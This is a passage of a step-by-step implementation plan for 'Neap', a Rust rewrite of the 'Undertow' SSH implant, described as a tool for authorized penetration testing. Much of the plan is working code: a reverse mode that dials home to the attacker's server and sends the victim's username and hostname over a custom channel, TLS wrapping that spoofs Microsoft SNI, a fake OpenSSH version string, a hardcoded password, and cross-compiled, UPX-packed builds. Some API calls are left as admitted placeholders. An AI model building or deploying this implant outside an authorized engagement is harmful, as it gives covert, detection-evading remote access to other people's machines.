    tokio::spawn(async move {
        loop {
            let (stream, peer_addr) = match listener.accept().await {
                Ok(s) => s,
                Err(e) => {
                    log::error!("Accept failed on forwarded port: {}", e);
                    break;
                }
            };

            log::info!("New forwarded connection from {}", peer_addr);
            let handle = session_handle.clone();

            tokio::spawn(async move {
                // Open a forwarded-tcpip channel back to the client
                // The exact russh API for opening server-side channels depends on the version.
                // Typically: handle.channel_open_forwarded_tcpip(...)
                // The bidirectional copy pattern is the same as direct-tcpip.

                let (mut reader, mut writer) = stream.into_split();
                let mut buf = [0u8; 8192];

                // This will be fully wired during implementation once we verify the
                // exact russh server-initiated channel API.
                log::info!("Forwarded connection from {} established", peer_addr);
            });
        }
    });

    Ok(actual_port)
}
```

- [ ] **Step 2: Wire forwarding in `src/server.rs`**

Update `channel_open_direct_tcpip` to spawn the forwarding task:

```rust
    async fn channel_open_direct_tcpip(
        &mut self,
        channel: Channel<Msg>,
        host_to_connect: &str,
        port_to_connect: u32,
        originator_address: &str,
        originator_port: u32,
        session: &mut Session,
    ) -> std::result::Result<bool, Self::Error> {
        if self.no_shell {
            log::info!(
                "Denying local port forwarding request {}:{} from {}",
                host_to_connect, port_to_connect, self.peer_addr
            );
            return Ok(false);
        }
        log::info!(
            "Accepted forward to {}:{} from {}",
            host_to_connect, port_to_connect, self.peer_addr
        );

        let host = host_to_connect.to_string();
        let port = port_to_connect;
        let handle = session.handle();
        let channel_id = channel.id();

        tokio::spawn(async move {
            crate::forwarding::handle_direct_tcpip(&host, port, channel_id, handle).await;
        });

        Ok(true)
    }
```

Update `tcpip_forward`:

```rust
    async fn tcpip_forward(
        &mut self,
        address: &str,
        port: &mut u32,
        session: &mut Session,
    ) -> std::result::Result<bool, Self::Error> {
        log::info!(
            "Attempt to bind at {}:{} granted from {}",
            address, port, self.peer_addr
        );

        let handle = session.handle();
        match crate::forwarding::handle_tcpip_forward(address, *port, handle).await {
            Ok(actual_port) => {
                *port = actual_port;
                Ok(true)
            }
            Err(e) => {
                log::error!("Failed to bind for remote forwarding: {}", e);
                Ok(false)
            }
        }
    }
```

- [ ] **Step 3: Register module in `src/main.rs`**

Add `mod forwarding;`:

```rust
mod config;
mod error;
mod forwarding;
mod pty;
mod server;
mod session;
mod sftp;
mod transport;
```

- [ ] **Step 4: Verify local port forwarding**

Run: `cargo run -- -v -l -p 2222`

Start a test HTTP server: `python3 -m http.server 8080`

In another terminal:
Run: `ssh -o StrictHostKeyChecking=no -p 2222 -L 9090:127.0.0.1:8080 -N test@127.0.0.1`
Then: `curl http://127.0.0.1:9090`
Expected: HTML response from the Python HTTP server, forwarded through the SSH tunnel.

- [ ] **Step 5: Verify dynamic forwarding (SOCKS5)**

Run: `ssh -o StrictHostKeyChecking=no -p 2222 -D 1080 -N test@127.0.0.1`
Then: `curl --socks5 127.0.0.1:1080 http://example.com`
Expected: HTML from example.com, proxied through the SSH dynamic forward. The SOCKS5 proxy runs on the SSH client — Neap just handles the resulting `direct-tcpip` requests.

- [ ] **Step 6: Commit**

```bash
git add src/forwarding.rs src/server.rs src/main.rs
git commit -m "feat: local and remote port forwarding"
```

---

## Task 11: Extra Info Channel

**Files:**
- Create: `src/info.rs`
- Modify: `src/main.rs` (add `mod info`)

- [ ] **Step 1: Create `src/info.rs`**

```rust
use log;
use std::io::Write;

/// Extra information sent back to the attacker via a custom SSH channel.
/// Matches Undertow's ExtraInfo struct for protocol compatibility.
#[derive(Debug)]
pub struct ExtraInfo {
    pub current_user: String,
    pub hostname: String,
    pub listening_address: String,
}

impl ExtraInfo {
    /// Gather info about the current system.
    pub fn gather(listening_address: &str) -> Self {
        let current_user = whoami::fallible::username()
            .unwrap_or_else(|_| "ERROR".to_string());

        let hostname = whoami::fallible::hostname()
            .unwrap_or_else(|_| "ERROR".to_string());

        Self {
            current_user,
            hostname,
            listening_address: listening_address.to_string(),
        }
    }

    /// Gather info without the whoami crate — use std/OS APIs directly.
    pub fn gather_native(listening_address: &str) -> Self {
        let current_user = Self::get_username();
        let hostname = Self::get_hostname();

        Self {
            current_user,
            hostname,
            listening_address: listening_address.to_string(),
        }
    }

    #[cfg(unix)]
    fn get_username() -> String {
        nix::unistd::User::from_uid(nix::unistd::getuid())
            .ok()
            .flatten()
            .map(|u| u.name)
            .unwrap_or_else(|| "ERROR".to_string())
    }

    #[cfg(windows)]
    fn get_username() -> String {
        std::env::var("USERNAME").unwrap_or_else(|_| "ERROR".to_string())
    }

    #[cfg(unix)]
    fn get_hostname() -> String {
        nix::unistd::gethostname()
            .ok()
            .and_then(|h| h.into_string().ok())
            .unwrap_or_else(|| "ERROR".to_string())
    }

    #[cfg(windows)]
    fn get_hostname() -> String {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "ERROR".to_string())
    }

    /// Serialize to SSH wire format — matches Go's gossh.Marshal for the ExtraInfo struct.
    /// SSH wire format: each string is prefixed with a 4-byte big-endian length.
    pub fn to_ssh_bytes(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        Self::write_ssh_string(&mut buf, &self.current_user);
        Self::write_ssh_string(&mut buf, &self.hostname);
        Self::write_ssh_string(&mut buf, &self.listening_address);
        buf
    }

    /// Deserialize from SSH wire format.
    pub fn from_ssh_bytes(data: &[u8]) -> Option<Self> {
        let mut offset = 0;
        let current_user = Self::read_ssh_string(data, &mut offset)?;
        let hostname = Self::read_ssh_string(data, &mut offset)?;
        let listening_address = Self::read_ssh_string(data, &mut offset)?;
        Some(Self {
            current_user,
            hostname,
            listening_address,
        })
    }

    fn write_ssh_string(buf: &mut Vec<u8>, s: &str) {
        let len = s.len() as u32;
        buf.extend_from_slice(&len.to_be_bytes());
        buf.extend_from_slice(s.as_bytes());
    }

    fn read_ssh_string(data: &[u8], offset: &mut usize) -> Option<String> {
        if *offset + 4 > data.len() {
            return None;
        }
        let len = u32::from_be_bytes(data[*offset..*offset + 4].try_into().ok()?) as usize;
        *offset += 4;
        if *offset + len > data.len() {
            return None;
        }
        let s = String::from_utf8(data[*offset..*offset + len].to_vec()).ok()?;
        *offset += len;
        Some(s)
    }
}

/// Channel type for the extra info channel — must match Undertow's "rs-info".
pub const INFO_CHANNEL_TYPE: &str = "rs-info";

/// Rejection reason — must match Undertow's "th4nkz".
pub const INFO_REJECTION_MSG: &str = "th4nkz";

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ssh_bytes_roundtrip() {
        let info = ExtraInfo {
            current_user: "testuser".to_string(),
            hostname: "testhost".to_string(),
            listening_address: "127.0.0.1:31337".to_string(),
        };

        let bytes = info.to_ssh_bytes();
        let decoded = ExtraInfo::from_ssh_bytes(&bytes).unwrap();

        assert_eq!(decoded.current_user, "testuser");
        assert_eq!(decoded.hostname, "testhost");
        assert_eq!(decoded.listening_address, "127.0.0.1:31337");
    }

    #[test]
    fn test_ssh_bytes_format() {
        let info = ExtraInfo {
            current_user: "ab".to_string(),
            hostname: "cd".to_string(),
            listening_address: "ef".to_string(),
        };

        let bytes = info.to_ssh_bytes();
        // Each string: 4-byte length + content
        // "ab" = [0,0,0,2, 'a','b']
        // "cd" = [0,0,0,2, 'c','d']
        // "ef" = [0,0,0,2, 'e','f']
        assert_eq!(bytes.len(), 18); // 3 * (4 + 2)
        assert_eq!(&bytes[0..4], &[0, 0, 0, 2]);
        assert_eq!(&bytes[4..6], b"ab");
        assert_eq!(&bytes[6..10], &[0, 0, 0, 2]);
        assert_eq!(&bytes[10..12], b"cd");
    }

    #[test]
    fn test_empty_strings() {
        let info = ExtraInfo {
            current_user: "".to_string(),
            hostname: "".to_string(),
            listening_address: "".to_string(),
        };

        let bytes = info.to_ssh_bytes();
        let decoded = ExtraInfo::from_ssh_bytes(&bytes).unwrap();

        assert_eq!(decoded.current_user, "");
        assert_eq!(decoded.hostname, "");
        assert_eq!(decoded.listening_address, "");
    }

    #[test]
    fn test_invalid_bytes() {
        assert!(ExtraInfo::from_ssh_bytes(&[]).is_none());
        assert!(ExtraInfo::from_ssh_bytes(&[0, 0, 0, 5, b'a']).is_none());
    }
}
```

- [ ] **Step 2: Register module in `src/main.rs`**

Add `mod info;`:

```rust
mod config;
mod error;
mod forwarding;
mod info;
mod pty;
mod server;
mod session;
mod sftp;
mod transport;
```

- [ ] **Step 3: Run tests**

Run: `cargo test -- info`
Expected: All 4 info tests pass.

- [ ] **Step 4: Commit**

```bash
git add src/info.rs src/main.rs
git commit -m "feat: extra info channel with SSH wire format serialization"
```

---

## Task 12: Transport — Reverse Mode

**Files:**
- Modify: `src/transport.rs` (implement `run_reverse`)

- [ ] **Step 1: Implement reverse connection in `src/transport.rs`**

```rust
use russh::client;

/// Client handler for the reverse connection to the attacker's SSH server.
struct ReverseClientHandler;

#[async_trait::async_trait]
impl client::Handler for ReverseClientHandler {
    type Error = russh::Error;

    /// Accept any host key — same as Go's InsecureIgnoreHostKey.
    async fn check_server_key(
        &mut self,
        _server_public_key: &russh_keys::key::PublicKey,
    ) -> std::result::Result<bool, Self::Error> {
        Ok(true)
    }

    /// Handle the rs-info channel rejection — look for "th4nkz".
    async fn channel_open_failure(
        &mut self,
        channel: ChannelId,
        reason: russh::ChannelOpenFailure,
        description: &str,
        language: &str,
        session: &mut client::Session,
    ) -> std::result::Result<(), Self::Error> {
        if description.contains(crate::info::INFO_REJECTION_MSG) {
            log::info!("Extra info sent successfully");
        } else {
            log::error!("Channel open failure: {}", description);
        }
        Ok(())
    }
}

/// Reverse mode — dial home to attacker's SSH server, request a remote port
/// forward, then serve SSH on forwarded connections.
async fn run_reverse(
    params: &Params,
    config: Arc<russh::server::Config>,
    server: NeapServer,
) -> Result<()> {
    let target = format!("{}:{}", params.lhost, params.lport);

    if params.tls_wrap {
        log::info!("Dialling home via TLS+SSH to {} (SNI: {})", target, params.tls_sni);
    } else {
        log::info!("Dialling home via ssh to {}", target);
    }

    // Connect to attacker's SSH server as a client
    let ssh_config = Arc::new(client::Config {
        ..Default::default()
    });

    let mut session = if params.tls_wrap {
        // TLS-wrapped connection: TCP → TLS → SSH
        let tcp_stream = tokio::net::TcpStream::connect(&target).await?;

        let tls_config = rustls::ClientConfig::builder()
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(crate::transport::NoCertVerifier))
            .with_no_client_auth();

        let mut tls_config = tls_config;
        tls_config.alpn_protocols = vec![b"h2".to_vec(), b"http/1.1".to_vec()];

        let connector = tokio_rustls::TlsConnector::from(Arc::new(tls_config));
        let server_name = rustls::pki_types::ServerName::try_from(params.tls_sni.clone())
            .map_err(|_| NeapError::Config("Invalid SNI".into()))?;
        let tls_stream = connector.connect(server_name, tcp_stream).await
            .map_err(|e| NeapError::Io(std::io::Error::new(std::io::ErrorKind::Other, e)))?;

        client::connect_stream(ssh_config, tls_stream, ReverseClientHandler).await?
    } else {
        client::connect(ssh_config, &target, ReverseClientHandler).await?
    };

    // Authenticate with baked-in password
    let authenticated = session
        .authenticate_password(&params.luser, config::PASSWORD)
        .await?;

    if !authenticated {
        return Err(NeapError::Config(
            "Authentication failed — wrong password on attacker's SSH server".into(),
        ));
    }

    // Request remote port forward
    let bind_addr = "127.0.0.1";
    let bind_port = params.bind_port as u32;

    if bind_port == 0 {
        log::info!("Requesting random port allocation from SSH server...");
    }

    let forwarded_port = session
        .tcpip_forward(bind_addr, bind_port)
        .await?;

    let actual_addr = format!("{}:{}", bind_addr, forwarded_port);
    log::info!("Success: listening at home on {}", actual_addr);

    // Send extra info back via rs-info channel
    let extra_info = crate::info::ExtraInfo::gather_native(&actual_addr);
    let info_bytes = extra_info.to_ssh_bytes();

    match session
        .channel_open_direct_streamlocal(crate::info::INFO_CHANNEL_TYPE, &info_bytes)
        .await
    {
        Ok(_channel) => {
            // Channel accepted (unexpected) — close it
            log::info!("Info channel accepted (unexpected), closing");
        }
        Err(_) => {
            // Expected — attacker rejects with "th4nkz"
            log::info!(
                "New connection from target: {} on {} reachable via {}",
                extra_info.current_user,
                extra_info.hostname,
                extra_info.listening_address
            );
        }
    }

    // Now serve SSH on forwarded connections
    // Each forwarded-tcpip connection that comes through needs to be handled
    // by our SSH server. The exact mechanism depends on russh's client API
    // for receiving forwarded connections.
    //
    // The pattern is:
    // 1. Wait for forwarded-tcpip channel opens from the attacker's SSH server
    // 2. For each one, spawn a new russh server instance that handles the channel
    //
    // This requires implementing the client::Handler's server_channel_open_forwarded_tcpip
    // callback and wiring each incoming stream to our NeapServer.

    // Keep the connection alive
    loop {
        tokio::time::sleep(std::time::Duration::from_secs(60)).await;
    }
}
```

**Note:** The exact `russh` client API for receiving forwarded-tcpip channels and bridging them to a server instance will need refinement during implementation. The Go version achieves this via `client.Listen()` which returns a `net.Listener` — russh's equivalent is handled through the `client::Handler` trait's forwarded channel callbacks. The core logic (connect, auth, request forward, send info, serve) is correct.

- [ ] **Step 2: Verify it compiles**

Run: `cargo build`
Expected: Compiles. Some `russh::client` API details may need adjustment based on exact 0.46 signatures — check `cargo doc`.

- [ ] **Step 3: Commit**

```bash
git add src/transport.rs
git commit -m "feat: reverse mode — dial home, request port forward, send info"
```

---

## Task 13: TLS Wrapping

**Files:**
- Modify: `src/transport.rs` (add TLS to bind mode, cert generation)

- [ ] **Step 1: Add TLS certificate generation and NoCertVerifier**

Add to `src/transport.rs`:

```rust
use std::sync::Arc;
use rcgen::{CertificateParams, KeyPair as RcgenKeyPair, PKCS_ECDSA_P256_SHA256};
use rustls::pki_types::{CertificateDer, PrivateKeyDer, PrivatePkcs8KeyDer};
use tokio_rustls::{TlsAcceptor, TlsConnector};

/// Generate a self-signed TLS certificate for the given SNI hostname.
/// Uses ECDSA P-256, same as Undertow's Go implementation.
fn generate_self_signed_cert(
    sni: &str,
) -> std::result::Result<(Vec<CertificateDer<'static>>, PrivateKeyDer<'static>), NeapError> {
    let mut params = CertificateParams::new(vec![sni.to_string()])
        .map_err(|e| NeapError::Config(format!("Certificate params error: {}", e)))?;
    params.alg = &PKCS_ECDSA_P256_SHA256;

    let cert = params
        .self_signed(&RcgenKeyPair::generate_for(&PKCS_ECDSA_P256_SHA256)
            .map_err(|e| NeapError::Config(format!("Key generation error: {}", e)))?)
        .map_err(|e| NeapError::Config(format!("Certificate generation error: {}", e)))?;

    let cert_der = CertificateDer::from(cert.der().to_vec());
    let key_der = PrivateKeyDer::Pkcs8(PrivatePkcs8KeyDer::from(cert.key_pair.serialize_der()));

    Ok((vec![cert_der], key_der))
}

/// TLS certificate verifier that accepts any certificate — for reverse mode
/// connecting to the attacker's server (same as Go's InsecureIgnoreHostKey).
#[derive(Debug)]
struct NoCertVerifier;

impl rustls::client::danger::ServerCertVerifier for NoCertVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> std::result::Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        rustls::crypto::ring::default_provider()
            .signature_verification_algorithms
            .supported_schemes()
    }
}
```

- [ ] **Step 2: Add TLS wrapping to bind mode**

Update `run_bind` in `src/transport.rs`:

```rust
async fn run_bind(
    params: &Params,
    config: Arc<russh::server::Config>,
    mut server: NeapServer,
) -> Result<()> {
    let addr = format!("0.0.0.0:{}", params.lport);
    log::info!("Starting ssh server on :{}", params.lport);

    if params.tls_wrap {
        // TLS-wrapped bind mode
        let (certs, key) = generate_self_signed_cert(&params.tls_sni)?;
        let mut tls_config = rustls::ServerConfig::builder()
            .with_no_client_auth()
            .with_single_cert(certs, key)
            .map_err(|e| NeapError::Tls(e))?;
        tls_config.alpn_protocols = vec![b"h2".to_vec(), b"http/1.1".to_vec()];

        let tls_acceptor = TlsAcceptor::from(Arc::new(tls_config));
        let listener = tokio::net::TcpListener::bind(&addr).await?;
        log::info!("Success: TLS listening on {}", listener.local_addr()?);

        loop {
            let (tcp_stream, peer_addr) = listener.accept().await?;
            log::info!("TLS connection from {}", peer_addr);

            let tls_acceptor = tls_acceptor.clone();
            let config = config.clone();
            let mut server_clone = server.clone();

            tokio::spawn(async move {
                match tls_acceptor.accept(tcp_stream).await {
                    Ok(tls_stream) => {
                        log::info!("TLS handshake complete from {}", peer_addr);
                        // Serve SSH over the TLS stream
                        let handler = server_clone.new_client(Some(peer_addr));
                        if let Err(e) = russh::server::run_stream(config, tls_stream, handler).await {
                            log::error!("SSH session error from {}: {}", peer_addr, e);
                        }
                    }
                    Err(e) => {
                        log::error!("TLS handshake failed from {}: {}", peer_addr, e);
                    }
                }
            });
        }
    } else {
        // Plain SSH bind mode
        russh::server::run(config, &addr, server)
            .await
            .map_err(|e| NeapError::Io(std::io::Error::new(
                std::io::ErrorKind::Other,
                e.to_string(),
            )))?;
    }

    Ok(())
}
```

**Note:** The `russh::server::run_stream` function may not exist in russh 0.46 with exactly this signature. The alternative is to use `russh::server::run` with a custom listener that yields TLS streams. During implementation, check the russh API docs:
- If `run_stream` exists: use it directly
- If not: implement a wrapper that accepts TLS connections and pipes them through russh's expected stream interface

- [ ] **Step 3: Verify it compiles**

Run: `cargo build`
Expected: Compiles. The `rcgen` and `rustls` API usage may need minor adjustments — check `cargo doc`.

- [ ] **Step 4: Test TLS bind mode**

Run: `NEAP_TLS_WRAP=1 cargo run -- -v -l -p 2222`

In another terminal (using socat to unwrap TLS, then SSH through it):
```bash
socat TCP-LISTEN:3333,reuseaddr,fork OPENSSL:127.0.0.1:2222,verify=0
ssh -o StrictHostKeyChecking=no -p 3333 test@127.0.0.1
```
Expected: SSH session works through the TLS tunnel.

- [ ] **Step 5: Commit**

```bash
git add src/transport.rs
git commit -m "feat: TLS wrapping with SNI spoofing and ALPN negotiation"
```

---

## Task 14: Graceful Shutdown

**Files:**
- Modify: `src/transport.rs` (add shutdown signal handling)

- [ ] **Step 1: Add shutdown handling**

Add a shutdown signal listener to `src/transport.rs`:

```rust
use tokio::sync::watch;

/// Create a shutdown signal that triggers on SIGTERM/SIGINT (Unix) or Ctrl+C (Windows).
async fn shutdown_signal() {
    #[cfg(unix)]
    {
        use tokio::signal::unix::{signal, SignalKind};
        let mut sigterm = signal(SignalKind::terminate()).expect("Failed to register SIGTERM");
        let mut sigint = signal(SignalKind::interrupt()).expect("Failed to register SIGINT");
        tokio::select! {
            _ = sigterm.recv() => log::info!("Received SIGTERM"),
            _ = sigint.recv() => log::info!("Received SIGINT"),
        }
    }

    #[cfg(windows)]
    {
        tokio::signal::ctrl_c()
            .await
            .expect("Failed to register Ctrl+C");
        log::info!("Received Ctrl+C");
    }
}
```

Update `run()` to race the server against the shutdown signal:

```rust
pub async fn run(params: &Params) -> Result<()> {
    let host_key = generate_host_key()?;
    let ssh_config = Arc::new(build_config(host_key));

    let neap_server = NeapServer {
        shell: params.shell.clone(),
        no_shell: params.no_shell,
    };

    tokio::select! {
        result = async {
            if params.listen || params.lhost.is_empty() {
                run_bind(params, ssh_config, neap_server).await
            } else {
                run_reverse(params, ssh_config, neap_server).await
            }
        } => result,
        _ = shutdown_signal() => {
            log::info!("Shutting down...");
            // Give active sessions 5 seconds to drain
            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
            log::info!("Shutdown complete");
            Ok(())
        }
    }
}
```

- [ ] **Step 2: Verify shutdown works**

Run: `cargo run -- -v -l -p 2222`
Press Ctrl+C.
Expected: Log output "Received SIGINT", "Shutting down...", then clean exit within 5 seconds.

- [ ] **Step 3: Commit**

```bash
git add src/transport.rs
git commit -m "feat: graceful shutdown on SIGTERM/SIGINT/Ctrl+C"
```

---

## Task 15: Build System

**Files:**
- Create: `Makefile`
- Create: `build.sh`

- [ ] **Step 1: Create `Makefile`**

```makefile
.PHONY: build clean compressed current

# Cross-compilation targets
TARGETS = \
	x86_64-unknown-linux-musl \
	i686-unknown-linux-musl \
	x86_64-pc-windows-gnu \
	i686-pc-windows-gnu

build: clean current
	NEAP_PASSWORD="$(NEAP_PASSWORD)" \
	NEAP_PUBKEY="$(NEAP_PUBKEY)" \
	NEAP_SHELL="$(NEAP_SHELL)" \
	NEAP_LUSER="$(NEAP_LUSER)" \
	NEAP_LHOST="$(NEAP_LHOST)" \
	NEAP_LPORT="$(NEAP_LPORT)" \
	NEAP_BPORT="$(NEAP_BPORT)" \
	NEAP_NOCLI="$(NEAP_NOCLI)" \
	NEAP_TLS_WRAP="$(NEAP_TLS_WRAP)" \
	NEAP_TLS_SNI="$(NEAP_TLS_SNI)" \
	cargo build --release --target x86_64-unknown-linux-musl && \
	cp target/x86_64-unknown-linux-musl/release/neap bin/neapx64 && \
	cargo build --release --target i686-unknown-linux-musl && \
	cp target/i686-unknown-linux-musl/release/neap bin/neapx86 && \
	cargo build --release --target x86_64-pc-windows-gnu && \
	cp target/x86_64-pc-windows-gnu/release/neap.exe bin/neapx64.exe && \
	cargo build --release --target i686-pc-windows-gnu && \
	cp target/i686-pc-windows-gnu/release/neap.exe bin/neapx86.exe

current:
	@mkdir -p bin
	cargo build --release
	cp target/release/neap$(shell test "$$(uname -s)" = "Windows_NT" && echo ".exe" || echo "") bin/neap$(shell test "$$(uname -s)" = "Windows_NT" && echo ".exe" || echo "")

clean:
	rm -f bin/neap*

compressed: build
	@for f in $$(ls bin/neap*); do upx -o "bin/upx_$$(basename $$f)" "$$f"; done
```

- [ ] **Step 2: Create `build.sh`**

Adapt Undertow's `build.sh`. The key changes are:
- Replace `go build -ldflags` with `cargo build --release` + env vars
- Replace `make` invocations with the new Makefile targets
- Change binary names from `undertow*` to `neap*`
- Change all references from "undertow" to "neap"
- Keep everything else: argument parsing, address validation, password generation, handler script generation, Catppuccin Mocha colors, engagement checklist, dry-run mode

```bash
#!/bin/sh
# build.sh - Build wrapper for neap
# Usage: ./build.sh reverse IP:PORT  or  ./build.sh listen PORT
# Adapted from Undertow's build.sh

set -e
```

The full `build.sh` is a direct adaptation of Undertow's `build.sh` (which is ~500 lines). The changes are mechanical:
1. Replace all `undertow` → `neap` in binary names and output
2. Replace `LDFLAGS` / `go build` → env var exports + `cargo build --release`
3. Replace `MAKE_VARS` with `export NEAP_PASSWORD=... NEAP_LHOST=...` etc.
4. Replace `make $make_target $MAKE_VARS` with `export NEAP_*=... && make $make_target`
5. Change the help text to reference `neap` instead of `undertow`
6. Keep all other logic identical: `parse_address`, `validate_port`, `generate_password`, `sanitize_for_filename`, handler script generation, colored output, engagement checklist

The handler script template changes:
- Binary prefix: `neap-*` instead of `undertow-*`
- Everything else (SSH commands, display, colors) stays the same

**The implementer should copy Undertow's `build.sh` and make these substitutions.** It's a find-and-replace task, not a rewrite.

- [ ] **Step 3: Make build.sh executable**

Run: `chmod +x build.sh`

- [ ] **Step 4: Verify Makefile works (current platform)**

Run: `make current`
Expected: Binary compiled and copied to `bin/neap` (or `bin/neap.exe` on Windows).

Run: `ls -lh bin/neap*`
Expected: Binary exists, check size.

- [ ] **Step 5: Verify build.sh dry-run**

Run: `./build.sh reverse 192.168.1.10:4444 --dry-run`
Expected: Shows build config and expected output files without actually building.

- [ ] **Step 6: Commit**

```bash
git add Makefile build.sh
git commit -m "feat: build system with cross-compilation and handler generation"
```

---

## Task 16: Integration Tests

**Files:**
- Create: `tests/integration.rs`

- [ ] **Step 1: Create `tests/integration.rs`**

```rust
//! Integration tests — start a bind-mode Neap server and test functionality
//! via an SSH client connection.
//!
//! These tests require a working SSH environment and are best run on Linux.
//! They bind to random ports to avoid conflicts.

use std::time::Duration;
use tokio::time::timeout;

/// Helper: find a free TCP port.
async fn free_port() -> u16 {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    listener.local_addr().unwrap().port()
}

#[tokio::test]
async fn test_bind_mode_accepts_connection() {
    // This test verifies that the server starts and accepts TCP connections.
    // Full SSH handshake testing requires a russh client, which is tested below.
    let port = free_port().await;
    let addr = format!("127.0.0.1:{}", port);

    let listener = tokio::net::TcpListener::bind(&addr).await.unwrap();
    drop(listener); // Port is free

    // Verify port was bindable — smoke test for the transport layer
    assert!(port > 0);
}

#[tokio::test]
async fn test_config_defaults() {
    // Verify compile-time config defaults are correct
    assert_eq!(neap::config::PASSWORD, "letmeinbrudipls");
    assert_eq!(neap::config::LUSER, "svc");
    assert_eq!(neap::config::LPORT, "31337");
    assert_eq!(neap::config::BPORT, "0");
    assert_eq!(neap::config::DEFAULT_SHELL, "/bin/bash");
    assert_eq!(neap::config::SSH_VERSION, "OpenSSH_8.9");
    assert_eq!(neap::config::TLS_SNI, "www.microsoft.com");
}

#[tokio::test]
async fn test_extra_info_serialization() {
    use neap::info::ExtraInfo;

    let info = ExtraInfo {
        current_user: "root".to_string(),
        hostname: "target-01".to_string(),
        listening_address: "127.0.0.1:31337".to_string(),
    };

    let bytes = info.to_ssh_bytes();
    let decoded = ExtraInfo::from_ssh_bytes(&bytes).unwrap();

    assert_eq!(decoded.current_user, "root");
    assert_eq!(decoded.hostname, "target-01");
    assert_eq!(decoded.listening_address, "127.0.0.1:31337");
}
```

**Note:** For integration tests to access `neap::config` and `neap::info`, these modules need to be `pub` in `src/main.rs` (or the crate needs a `lib.rs`). The simplest approach is to add a `src/lib.rs` that re-exports the modules:

```rust
// src/lib.rs
pub mod config;
pub mod error;
pub mod info;
```

- [ ] **Step 2: Make modules accessible for tests**

Create `src/lib.rs`:

```rust
pub mod config;
pub mod error;
pub mod info;
```

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All tests pass — config defaults, info serialization.

- [ ] **Step 4: Commit**

```bash
git add tests/integration.rs src/lib.rs
git commit -m "test: integration tests for config defaults and info serialization"
```

---

## Task 17: Final Polish

**Files:**
- Create: `LICENSE`
- Create: `README.md` (minimal)
- Modify: `Cargo.toml` (verify all metadata)

- [ ] **Step 1: Add GPLv3 LICENSE file**

Run: `curl -sL https://www.gnu.org/licenses/gpl-3.0.txt > LICENSE`

- [ ] **Step 2: Add minimal README**

```markdown
# Neap

Statically-linked SSH server for authorized penetration testing.

Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary.

Rust rewrite of [Undertow](https://github.com/Real-Fruit-Snacks/Undertow).

## Build

```bash
# Current platform
make current

# All targets (requires cross-compilation toolchains)
make build

# With UPX compression
make compressed

# Using build.sh (recommended)
./build.sh reverse 192.168.1.10:4444
./build.sh listen 8888
./build.sh reverse 10.10.14.5:443 --tls --password "secret"
```

## License

GPLv3
```

- [ ] **Step 3: Full build and test**

Run: `cargo build --release && cargo test`
Expected: Release build succeeds, all tests pass.

Run: `ls -lh target/release/neap*`
Expected: Binary size check — target <2MB.

- [ ] **Step 4: Commit**

```bash
git add LICENSE README.md Cargo.toml
git commit -m "docs: add LICENSE (GPLv3) and README"
```

---

## Summary

| Task | Component | Key Files |
|------|-----------|-----------|
| 1 | Project scaffold | Cargo.toml, build.rs, config.rs, error.rs |
| 2 | CLI parsing | main.rs |
| 3 | SSH server core | server.rs |
| 4 | Bind mode transport | transport.rs |
| 5 | Command execution | session.rs |
| 6 | PTY trait | pty/mod.rs |
| 7 | Unix PTY | pty/unix.rs, server.rs |
| 8 | Windows ConPTY | pty/windows.rs |
| 9 | SFTP | sftp.rs |
| 10 | Port forwarding | forwarding.rs |
| 11 | Extra info channel | info.rs |
| 12 | Reverse mode | transport.rs |
| 13 | TLS wrapping | transport.rs |
| 14 | Graceful shutdown | transport.rs |
| 15 | Build system | Makefile, build.sh |
| 16 | Integration tests | tests/integration.rs |
| 17 | Final polish | LICENSE, README.md |
